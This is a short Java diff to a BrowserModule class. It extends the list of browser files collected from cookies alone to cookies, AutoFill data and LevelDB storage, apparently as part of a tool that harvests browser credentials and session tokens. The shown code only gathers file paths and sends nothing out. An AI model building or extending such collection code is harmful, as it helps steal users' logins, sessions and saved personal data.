@@ -16,6 +16,10 @@ public abstract class BrowserModule {
 
 	public abstract String getCookie();
 
+	public abstract String getAutoFill();
+	
+	public abstract String getLevelDB();
+
 	public String getBrowser() {
 		return browser;
 	}
@@ -23,7 +27,9 @@ public abstract class BrowserModule {
 	public List<FileData> getFiles() {
 		List<FileData> files = new ArrayList<>();
 
-		files.add(new FileData(new File(getCookie()), "Cookie"));
+		files.add(new FileData(new File(getCookie()), "Cookies"));
+		files.add(new FileData(new File(getAutoFill()), "AutoFill"));
+		files.add(new FileData(new File(getLevelDB()), "leveldb"));
 		return files;
 	}
 
